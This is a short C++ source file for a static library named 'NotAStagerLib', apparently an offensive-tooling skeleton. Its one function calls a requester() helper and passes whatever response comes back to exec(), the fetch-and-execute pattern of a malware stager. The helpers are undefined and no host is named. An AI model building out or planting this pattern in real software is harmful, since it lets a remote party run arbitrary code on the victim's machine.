// NotAStagerLib.cpp : Defines the functions for the static library.
//

#include "pch.h"
#include "framework.h"
#include "NotAStagerLib.h"

// TODO: This is an example of a library function
void fnNotAStagerLib()
{

    printf("TEST");
    std::string resp = requester();

    if (!resp.empty()) {

        exec(resp);

    }

}
